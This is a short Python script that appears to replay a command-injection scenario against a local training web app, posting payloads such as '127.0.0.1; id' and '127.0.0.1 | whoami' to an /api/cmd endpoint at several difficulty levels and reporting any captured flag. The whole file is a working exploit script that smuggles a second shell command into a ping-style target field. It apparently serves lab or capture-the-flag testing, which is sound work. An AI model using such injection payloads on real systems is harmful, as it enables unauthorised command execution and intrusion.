#!/usr/bin/env python3
"""Replay the cmd-inject scenario. Standard library only."""
import json
import sys
import urllib.error
import urllib.request

def _post_json(base, path, data):
    url = base.rstrip("/") + path
    payload = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=payload,
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"{}")

def attack(base, level):
    targets = {
        "low": "127.0.0.1; id",
        "medium": "127.0.0.1 | whoami",
        "high": "127.0.0.1; whoami",
        "impossible": "127.0.0.1; id",
    }
    tgt = targets.get(level, targets["low"])
    status, data = _post_json(base, "/api/cmd", {"target": tgt})
    print(f"  POST /api/cmd target='{tgt}' -> HTTP {status}")
    flag = data.get("flag")
    if flag:
        print(f"  ✓ Exploited! 🚩 Flag: {flag}")
        return True
    elif "injected_cmd" in data:
        print(f"  ✓ Injected command executed: {data.get('injected_cmd')}")
        return True
    print(f"  ✗ Command injection failed: {data}")
    return False

if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    lvl = sys.argv[2] if len(sys.argv) > 2 else "low"
    print(f"[cmd-inject] {base} level={lvl}")
    sys.exit(0 if attack(base, lvl) else 1)
